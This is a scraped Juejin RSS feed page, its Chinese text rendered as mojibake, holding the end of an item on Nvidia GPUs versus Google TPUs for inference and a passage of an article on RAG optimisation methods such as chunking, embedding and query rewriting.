<p>è‹±ä¼Ÿè¾¾å‡­å€Ÿè®­ç»ƒæŠ€æœ¯çš„è¾‰ç…Œå†å²å»ºç«‹èµ·äº†åºå¤§çš„è®¡ç®—å¸å›½ï¼Œä½†æ¨ç†æ‰æ˜¯æœªæ¥ï¼Œåœ¨è¿™ä¸ªé¢†åŸŸï¼Œè‹±ä¼Ÿè¾¾çš„æ¶æ„ä¼˜åŠ¿æ­£åœ¨é€æ¸æ¶ˆå¤±ã€‚è°·æ­Œçš„ TPU æ‹¥æœ‰å››å€çš„æ€§ä»·æ¯”ï¼Œæ­£å¸å¼•ç€ Midjourneyï¼ˆæˆæœ¬é™ä½ 65%ï¼‰ã€Anthropicï¼ˆ100 ä¸‡é¢—èŠ¯ç‰‡ï¼‰å’Œ Metaï¼ˆæ•°åäº¿ç¾å…ƒçš„è°ˆåˆ¤ï¼‰ç­‰å·¨å¤´ã€‚</p>
<p>å‚è€ƒé“¾æ¥ï¼š</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.ainewshub.org%2Fpost%2Fai-inference-costs-tpu-vs-gpu-2025" target="_blank" title="https://www.ainewshub.org/post/ai-inference-costs-tpu-vs-gpu-2025" ref="nofollow noopener noreferrer">www.ainewshub.org/post/ai-infâ€¦</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.investing.com%2Fnews%2Fstock-market-news%2Falphabet-could-see-billions-in-added-revenue-from-tpu-sales-morgan-stanley-says-4383972%3Futm_source%3Dchatgpt.com" target="_blank" title="https://www.investing.com/news/stock-market-news/alphabet-could-see-billions-in-added-revenue-from-tpu-sales-morgan-stanley-says-4383972?utm_source=chatgpt.com" ref="nofollow noopener noreferrer">www.investing.com/news/stock-â€¦</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸€æ–‡è®²æ¸…ï¼šRAGçš„7ç§ä¼˜åŒ–æ–¹æ³•ï¼Œçœ‹å®Œç®€ç›´é†é†çŒé¡¶ï¼]]></title>    <link>https://juejin.cn/post/7581666412021055497</link>    <guid>https://juejin.cn/post/7581666412021055497</guid>    <pubDate>2025-12-09T09:06:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581666412021055497" data-draft-id="7581658157145325618" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸€æ–‡è®²æ¸…ï¼šRAGçš„7ç§ä¼˜åŒ–æ–¹æ³•ï¼Œçœ‹å®Œç®€ç›´é†é†çŒé¡¶ï¼"/> <meta itemprop="keywords" content="LLM"/> <meta itemprop="datePublished" content="2025-12-09T09:06:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ™ºæ³ŠAI"/> <meta itemprop="url" content="https://juejin.cn/user/3572727470361578"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸€æ–‡è®²æ¸…ï¼šRAGçš„7ç§ä¼˜åŒ–æ–¹æ³•ï¼Œçœ‹å®Œç®€ç›´é†é†çŒé¡¶ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3572727470361578/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ™ºæ³ŠAI
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T09:06:10.000Z" title="Tue Dec 09 2025 09:06:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»12åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¤§è§„æ¨¡è¯­è¨€æ¨¡å‹ï¼ˆLLMsï¼‰å·²æ·±åº¦èå…¥æ—¥å¸¸ç”Ÿæ´»ä¸èŒåœºå®è·µï¼Œå‡­å€Ÿå…¶å“è¶Šçš„å¤šåŠŸèƒ½æ€§å’Œæ™ºèƒ½æ°´å¹³ï¼Œå½»åº•é‡å¡‘äº†äººç±»ä¸ä¿¡æ¯äº¤äº’çš„æ¨¡å¼ã€‚</p>
<p>å°½ç®¡å¦‚æ­¤ï¼Œè¿™ç±»æ¨¡å‹ä»å­˜åœ¨æ˜æ˜¾å±€é™ã€‚å®ƒä»¬å¯èƒ½è¾“å‡ºå…·æœ‰è¯¯å¯¼æ€§çš„è™šæ„å†…å®¹ï¼ˆ"å¹»è§‰"ï¼‰ï¼Œæ‰€ä¾æ®çš„çŸ¥è¯†åº“å­˜åœ¨æ»åæ€§ï¼Œå¯¹ä¸“ä¸šé¢†åŸŸçŸ¥è¯†çš„å¤„ç†æ•ˆç‡æœ‰é™ï¼Œä¸”ç¼ºä¹è¡Œä¸šçºµæ·±æ´å¯ŸåŠ›ï¼Œé€»è¾‘æ¨ç†èƒ½åŠ›ä¹Ÿå°šæœªå®Œå–„ã€‚</p>
<p>åœ¨å®é™…åº”ç”¨åœºæ™¯ä¸­ï¼Œæ•°æ®å¿…é¡»ä¿æŒåŠ¨æ€æ›´æ–°ä»¥è¿½è¸ªæœ€æ–°è¿›å±•ï¼Œç”Ÿæˆå†…å®¹éœ€å…·å¤‡å®Œæ•´çš„å¯è¿½æº¯æ€§ï¼Œä»è€Œå®ç°æˆæœ¬ä¼˜åŒ–å’Œæ•°æ®éšç§ä¿æŠ¤ã€‚</p>
<p>å•çº¯ä¾èµ–è¿™ç±»"é»‘ç›’"ç³»ç»Ÿå·²æ— æ³•æ»¡è¶³éœ€æ±‚ï¼Œå¿…é¡»å¼€å‘æ›´ç²¾å‡†çš„è§£å†³æ–¹æ¡ˆæ¥åº”å¯¹å¤æ‚æŒ‘æˆ˜ã€‚</p>
<p>æ£€ç´¢å¢å¼ºç”ŸæˆæŠ€æœ¯ï¼ˆRetrieval-Augmented Generationï¼ŒRAGï¼‰æ­£æ˜¯ä¸ºå¡«è¡¥è¿™ä¸€ç©ºç™½è€Œè¯ç”Ÿï¼Œæˆä¸ºæ¨åŠ¨LLMæ—¶ä»£å‘å±•çš„å…³é”®æŠ€æœ¯æ–¹å‘ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1953cadb98bb42fda34fd7431518c969~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765875969&amp;x-signature=D1UCdMLVwzmhDSXbZEQUGO%2BjfW0%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p><strong>æ›´å¤šAIå¤§æ¨¡å‹å­¦ä¹ è§†é¢‘åŠèµ„æºï¼Œéƒ½åœ¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fyuan.zhipoai.cn%2F" target="_blank" title="https://yuan.zhipoai.cn/" ref="nofollow noopener noreferrer">æ™ºæ³ŠAI</a>ã€‚</strong></p>
<p>åŸºç¡€RAGæ¶æ„çš„æµç¨‹è®¾è®¡æä¸ºç®€æ´ï¼Œå…¶æ ¸å¿ƒç‰¹å¾åœ¨äºæ•°æ®æµçš„å•å‘æ€§ã€‚è¿™ç§æ¶æ„çš„å¿«é€Ÿéƒ¨ç½²ä¼˜åŠ¿æ˜¾è‘—ï¼Œä½†è·ç¦»ç”Ÿäº§çº§åº”ç”¨ä»å­˜åœ¨å·®è·ã€‚</p>
<p>ä¸ºæå‡æ–‡æ¡£å¬å›ç‡ä¸ç³»ç»Ÿé²æ£’æ€§ï¼Œä¸»è¦ä¼˜åŒ–æ–¹å‘å¯å½’çº³ä¸ºä¸¤ç±»ï¼š</p>
<p><strong>â€Œæ‰©å±•å¬å›é€šé“â€Œ</strong>ï¼šé‡‡ç”¨æŸ¥è¯¢å˜æ¢ï¼ˆå­æŸ¥è¯¢ã€RAG-Fusionï¼‰ã€æ··åˆæ£€ç´¢ç­‰å¤šè·¯å¬å›ç­–ç•¥ï¼Œä»¥æœ€å¤§åŒ–ä¿¡æ¯è¦†ç›–èŒƒå›´ï¼›</p>
<p><strong>â€Œå¼ºåŒ–åé¦ˆé—­ç¯â€Œ</strong>ï¼šé€šè¿‡é‡æ’åºï¼ˆRerankï¼‰ã€å›æº¯æç¤ºï¼ˆBack-Promptingï¼‰ã€Self-RAGç­‰æŠ€æœ¯å¯¹åˆå§‹ç»“æœè¿›è¡Œè¿­ä»£ä¼˜åŒ–ï¼Œä»è€Œæå‡è¾“å‡ºå‡†ç¡®æ€§ã€‚</p>
<p>ç»æ­¤ä¼˜åŒ–åï¼ŒRAGæ¶æ„ä¸­çš„æ•°æ®æµä»å•å‘ä¼ è¾“è½¬å˜ä¸ºå¤šç»´åº¦å¹¶è¡Œäº¤äº’æ¨¡å¼ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3246c3e165e646f0916e25b06f9b8d89~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765875969&amp;x-signature=aZ56cVEwj%2Bw5sfPo%2FFLkgHL3Mrc%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p><strong>ä¸€ã€</strong>* <em>æ–‡æœ¬æ•°æ®é¢„å¤„ç†</em>*</p>
<p>æ— è®ºRAGç³»ç»Ÿçš„æ¶æ„è®¾è®¡å¦‚ä½•æ¼”è¿›ï¼ŒåŸºäºæ•°æ®é©±åŠ¨çš„æœ¬è´¨ç‰¹æ€§å†³å®šäº†â€Œé«˜ä¿¡å™ªæ¯”æ•°æ®â€Œå§‹ç»ˆå…·æœ‰æ ¸å¿ƒä»·å€¼ã€‚åœ¨æ£€ç´¢æµç¨‹å‰å¯¹åŸå§‹æ•°æ®çš„ä¼˜åŒ–ç­–ç•¥å¯å½’çº³ä¸ºä»¥ä¸‹å…³é”®æ–¹æ³•ï¼š</p>
<p><strong>â€Œå®ä½“è§£æâ€Œ</strong></p>
<p>é€šè¿‡æ¶ˆæ­§å®ç°å®ä½“ä¸æœ¯è¯­çš„ç»Ÿä¸€å¼•ç”¨ã€‚ä¾‹å¦‚å°†"LLM"ã€"å¤§è¯­è¨€æ¨¡å‹"å’Œ"å¤§æ¨¡å‹"æ˜ å°„ä¸ºæ ‡å‡†åŒ–æœ¯è¯­ä½“ç³»ã€‚</p>
<p><strong>â€Œæ–‡æ¡£åˆ’åˆ†â€Œ</strong></p>
<p>éœ€ç§‘å­¦è§„åˆ’æ–‡æ¡£ä¸»é¢˜åˆ†å¸ƒç­–ç•¥ï¼šåŒç±»ä¸»é¢˜æ–‡æ¡£åº”é‡‡å–é›†ä¸­å­˜å‚¨è¿˜æ˜¯åˆ†å¸ƒå¼å­˜æ”¾ï¼Ÿå½“äººç±»ä¸“å®¶éƒ½æ— æ³•å¿«é€Ÿå®šä½ç›¸å…³æ–‡æ¡£æ—¶ï¼Œæ£€ç´¢ç³»ç»Ÿå¿…ç„¶é¢ä¸´ç›¸åŒå›°å¢ƒã€‚</p>
<p><strong>â€Œæ•°æ®å¢å¼ºâ€Œ</strong></p>
<p>å¼•å…¥åŒä¹‰æ›¿æ¢ã€è¯­ä¹‰é‡æ„åŠå¤šè¯­è¨€ç¿»è¯‘ç­‰æ‰‹æ®µï¼Œæ˜¾è‘—æå‡çŸ¥è¯†åº“çš„è¯­ä¹‰è¦†ç›–ç»´åº¦ã€‚</p>
<p><strong>â€Œæ—¶æ•ˆæ•°æ®å¤„ç†â€Œ</strong></p>
<p>é’ˆå¯¹åŠ¨æ€æ›´æ–°é¢†åŸŸï¼ˆå¦‚æ—¶æ•ˆæ€§å†…å®¹ï¼‰ï¼Œéœ€å»ºç«‹æ–‡æ¡£ç‰ˆæœ¬æ§åˆ¶æœºåˆ¶ï¼Œè‡ªåŠ¨æ ‡è®°æˆ–æ·˜æ±°è¿‡æ—¶ä¿¡æ¯ã€‚</p>
<p><strong>â€Œå…ƒæ•°æ®æ‰©å±•â€Œ</strong></p>
<p>è¡¥å……å†…å®¹æ‘˜è¦ã€æ›´æ–°æ—¶é—´æˆ³ã€æ½œåœ¨ç”¨æˆ·æŸ¥è¯¢ç­‰ç»“æ„åŒ–ä¿¡æ¯ï¼Œæ„å»ºå¤šç»´åº¦çš„çŸ¥è¯†è¡¨å¾ä½“ç³»ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/367419e3b0b54bf7b26117662f7a3615~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765875969&amp;x-signature=AP5igDm8Rryow9t5oYbI22XrI6o%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p><strong>äºŒã€æ–‡æœ¬åˆ†å—</strong></p>
<p>åœ¨çŸ¥è¯†åº“æ£€ç´¢åœºæ™¯ä¸­ï¼Œæ•°æ®è§„æ¨¡é€šå¸¸è¿œè¶…LLMçš„è¾“å…¥å®¹é‡é™åˆ¶ï¼Œå› æ­¤æœ‰æ•ˆçš„åˆ†å—ç­–ç•¥éœ€è¦åœ¨æ»¡è¶³é•¿åº¦çº¦æŸçš„å‰æä¸‹ï¼Œå…¼é¡¾å—é—´å·®å¼‚æ€§ä¸å—å†…ä¸€è‡´æ€§ã€‚</p>
<p>è¿™æ˜¯ç†è®ºä¸Šçš„æœ€ä¼˜è§£ï¼Œä½†å®é™…æ–‡æœ¬å¾€å¾€å‘ˆç°æ•£æ–‡ç‰¹å¾â€”â€”æ®µè½é—´ç•Œé™æ¨¡ç³Šã€å†…å®¹æ¾æ•£ä¸”ç¯‡å¹…å†—é•¿ã€‚</p>
<p>æˆ‘ä»¬æ— æ³•é¢„å…ˆå®ç°ç»å¯¹å®Œç¾çš„å†…å®¹åˆ†å—ï¼Œæ¯•ç«Ÿåç»­æœ‰LLMè¿™ç±»æ™ºèƒ½æ¨¡å‹æ¥æ¶ˆåŒ–å¤„ç†ï¼Œæˆ‘ä»¬æä¾›çš„æ–‡æœ¬å—æœ¬è´¨ä¸Šæ˜¯"æç¤º"è€Œéå®Œæ•´ç­”æ¡ˆã€‚</p>
<p>å°½ç®¡å¦‚æ­¤ï¼Œä»éœ€ç¡®ä¿ä¼ é€’ç»™LLMçš„æ˜¯æœ‰ä»·å€¼çš„ä¿¡æ¯ï¼Œè€Œéå¹²æ‰°å…¶æ³¨æ„åŠ›çš„å™ªå£°ã€‚ä»¥ä¸‹æ˜¯å‡ ç§è¿›é˜¶åˆ†å—æŠ€æœ¯æ–¹æ¡ˆï¼š</p>
<p><strong>å¥åˆ†å‰²</strong>ï¼šå€ŸåŠ©NLTKæˆ–spaCyç­‰åº“çš„å¥å­åˆ‡åˆ†èƒ½åŠ›ï¼Œç°ä»£å¼€å‘æ¡†æ¶å¦‚langchainå‡å·²å†…ç½®è¯¥åŠŸèƒ½</p>
<p><strong>é€’å½’</strong>* <em>åˆ†å‰²</em>*ï¼šé‡‡ç”¨åˆ†å±‚åˆ†å—ç­–ç•¥ï¼Œlangchainæ¡†æ¶ä¼šå…ˆæŒ‰åŒæ¢è¡Œç¬¦(\n\n)åˆ†å‰²æ®µè½ï¼Œè‹¥å—ä½“è¶…å‡ºé˜ˆå€¼åˆ™ç»§ç»­ç”¨å•æ¢è¡Œç¬¦(\n)ç»†åˆ†ï¼Œæœ€ç»ˆå¯ç»†åŒ–åˆ°ç©ºæ ¼æˆ–å¥å·çº§åˆ†å‰²ã€‚</p>
<p>è¿™ç§åŠ¨æ€è°ƒæ•´æœºåˆ¶èƒ½é€‚åº”ä¸åŒå¯†åº¦æ–‡æœ¬â€”â€”ä¿¡æ¯å¯†é›†åŒºéœ€è¦æ›´ç»†ç²’åº¦åˆ†å‰²ï¼Œè€Œå†…å®¹ç¨€ç–åŒºå¯é‡‡ç”¨è¾ƒå¤§åŒºå—</p>
<p><strong>è¯­ä¹‰</strong>* <em>åˆ†å‰²</em>*ï¼šåŸºäºæ–‡æœ¬å‘é‡ç›¸ä¼¼åº¦è®¡ç®—å®ç°è¯­ä¹‰å•å…ƒåˆ’åˆ†</p>
<p><strong>ç»“æ„åŒ–å¤„ç†</strong>ï¼šé’ˆå¯¹Markdown/LaTeX/JSONç­‰ç‰¹æ®Šæ ¼å¼çš„ä¸“ç”¨åˆ†å‰²å™¨ï¼Œèƒ½å®Œæ•´ä¿ç•™æ–‡æ¡£åŸå§‹ç»“æ„</p>
<p>åˆ†å—å°ºå¯¸çš„ç¡®å®šéœ€ç»¼åˆè€ƒè™‘åµŒå…¥æ¨¡å‹ç‰¹æ€§ã€æ–‡æ¡£ç±»å‹åŠæŸ¥è¯¢å¤æ‚åº¦ã€‚å¤„ç†å­¦æœ¯è®ºæ–‡ç­‰é•¿æ–‡æœ¬æ—¶ï¼Œè¾ƒå¤§åŒºå—æœ‰åˆ©äºç»´æŒä¸Šä¸‹æ–‡è¿è´¯æ€§ï¼›åˆ†æç¤¾äº¤åª’ä½“çŸ­æ–‡æœ¬åˆ™é€‚åˆè¾ƒå°åŒºå—ã€‚</p>
<p>å½“ç”¨æˆ·æŸ¥è¯¢ç®€æ´å…·ä½“æ—¶å»ºè®®é‡‡ç”¨å°åŒºå—ï¼Œå¤æ‚æŸ¥è¯¢åˆ™éœ€è¦æ›´å¤§ä¸Šä¸‹æ–‡æ”¯æŒã€‚å®è·µè¡¨æ˜ï¼Œç»è¿‡åå¤æµ‹è¯•éªŒè¯ï¼Œ128tokençš„åŒºå—å°ºå¯¸åœ¨å¤šæ•°åœºæ™¯ä¸‹è¡¨ç°æœ€ä¼˜ï¼Œå¯ä½œä¸ºåŸºå‡†å‚æ•°è¿›è¡Œåç»­è°ƒä¼˜ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1c2490c3d2404e77bf02c12d94aab099~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765875969&amp;x-signature=y0exTkwqR8yxmwskbslUXmcWuPM%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p><strong>ä¸‰ã€åµŒå…¥</strong></p>
<p>æ•°æ®å¤„ç†çš„æœ€ç»ˆç¯èŠ‚æ¶‰åŠæ–‡æœ¬æ•°æ®çš„ç±»å‹è½¬æ¢ï¼Œå³é€šè¿‡åµŒå…¥ï¼ˆEmbeddingï¼‰æ¨¡å‹å°†æ–‡æœ¬æ•°æ®å‘é‡åŒ–ï¼ˆVectorizationï¼‰ï¼Œä¸ºåç»­çš„å‘é‡æ£€ç´¢ï¼ˆVector Retrievalï¼‰åšå‡†å¤‡ã€‚</p>
<p>åœ¨åµŒå…¥è¿‡ç¨‹ä¸­ï¼Œå¯é€šè¿‡ä»¥ä¸‹æ–¹æ³•ä¼˜åŒ–æ€§èƒ½ï¼š</p>
<p><strong>åŠ¨æ€åµŒå…¥</strong>ï¼šåŠ¨æ€åµŒå…¥èƒ½æœ‰æ•ˆè§£å†³ä¸€è¯å¤šä¹‰é—®é¢˜ã€‚ä»¥"å…‰ç›˜"ä¸ºä¾‹ï¼Œåœ¨"æˆ‘ä¹°äº†ä¸€å¼ å…‰ç›˜"ä¸­ï¼Œå®ƒæŒ‡å®ä½“å…‰ç›˜ï¼›è€Œåœ¨"å…‰ç›˜è¡ŒåŠ¨"ä¸­ï¼Œåˆ™è¡¨ç¤º"åƒå®Œç›˜ä¸­é£Ÿç‰©"çš„è¡Œä¸ºã€‚</p>
<p>é™æ€åµŒå…¥çš„å‘é‡è¡¨ç¤ºæ˜¯å›ºå®šçš„ï¼Œè€Œé‡‡ç”¨è‡ªæ³¨æ„åŠ›æœºåˆ¶çš„æ¨¡å‹ï¼ˆå¦‚BERTï¼‰èƒ½åŠ¨æ€è°ƒæ•´è¯ä¹‰ï¼Œä½¿åŒä¸€è¯æ±‡åœ¨ä¸åŒè¯­å¢ƒä¸‹è·å¾—å·®å¼‚åŒ–å‘é‡è¡¨ç¤ºã€‚</p>
<p><strong>åµŒå…¥æ¨¡å‹å¾®è°ƒâ€Œ</strong>ï¼šå¤šæ•°åµŒå…¥æ¨¡å‹åŸºäºé€šç”¨è¯­æ–™è®­ç»ƒï¼Œé’ˆå¯¹å‚ç›´é¢†åŸŸæ—¶ï¼Œå¯é€šè¿‡å¾®è°ƒæå‡æ¨¡å‹å¯¹ä¸“ä¸šè¯æ±‡çš„ç†è§£èƒ½åŠ›ï¼Œç¡®ä¿å…¶å¹³ç­‰å¯¹å¾…é¢†åŸŸæœ¯è¯­å’Œé€šç”¨è¯æ±‡ï¼Œé¿å…æ³¨æ„åŠ›åˆ†æ•£ã€‚</p>
<p><strong>æ··åˆåµŒå…¥</strong>ï¼šåˆ†åˆ«ä¸ºç”¨æˆ·æŸ¥è¯¢å’ŒçŸ¥è¯†åº“æ–‡æœ¬é€‰æ‹©ä¸åŒçš„åµŒå…¥æ¨¡å‹ï¼Œä»¥é€‚é…å„è‡ªçš„è¯­è¨€ç‰¹å¾å’Œè¯­ä¹‰éœ€æ±‚ã€‚</p>
<p><strong>å››ã€</strong>* <em>æŸ¥è¯¢ä¼˜åŒ–</em>*</p>
<p>åœ¨å®é™…åº”ç”¨åœºæ™¯ä¸­ï¼Œç”¨æˆ·è¡¨è¾¾çš„å¤šæ ·æ€§å’Œæ¨¡ç³Šæ€§å¸¸ä¼šå¯¼è‡´æ£€ç´¢ç³»ç»Ÿçš„å¬å›ç‡ä¸å‡†ç¡®ç‡ä¸‹é™ã€‚</p>
<p>ä¸ºæå‡æ£€ç´¢æ•ˆæœï¼Œéœ€å¯¹æŸ¥è¯¢è¯­å¥è¿›è¡Œä¼˜åŒ–å¤„ç†ï¼Œä»¥æ ‡å‡†åŒ–å’Œæ‰©å……æŸ¥è¯¢ä¿¡æ¯ï¼Œä»è€Œå¸®åŠ©ç³»ç»Ÿæ›´ç²¾å‡†åœ°å®šä½ç›¸å…³æ–‡æ¡£ã€‚</p>
<p>ä¸»è¦çš„æŸ¥è¯¢ä¼˜åŒ–æŠ€æœ¯åŒ…æ‹¬ï¼š</p>
<p><strong>â€ŒæŸ¥è¯¢é‡å†™â€Œ</strong></p>
<p>åˆ©ç”¨å¤§è¯­è¨€æ¨¡å‹(LLM)çš„æç¤ºåŠŸèƒ½ï¼Œæˆ–éƒ¨ç½²ç»è¿‡å¾®è°ƒçš„ä¸“ç”¨"é—®é¢˜é‡å†™å™¨"(é€šå¸¸åŸºäºå°å‹Transformeræ¶æ„)ï¼Œå¯¹åŸå§‹æŸ¥è¯¢è¿›è¡Œè¯­ä¹‰ç­‰ä»·æ”¹å†™ã€‚</p>
<p><strong>â€Œåé€€æç¤ºâ€Œ</strong></p>
<p>å¼•å¯¼LLMç”Ÿæˆä¸€ä¸ªæ›´é«˜å±‚çº§çš„æŠ½è±¡é—®é¢˜(ç§°ä¸º"åé€€"é—®é¢˜)ã€‚è¯¥é—®é¢˜çš„æŠ½è±¡ç¨‹åº¦éœ€æ ¹æ®ä»»åŠ¡éœ€æ±‚åŠ¨æ€è°ƒæ•´ï¼Œæœ€ç»ˆå°†åé€€é—®é¢˜ä¸åŸå§‹æŸ¥è¯¢å…±åŒç”¨äºæ£€ç´¢ã€‚</p>
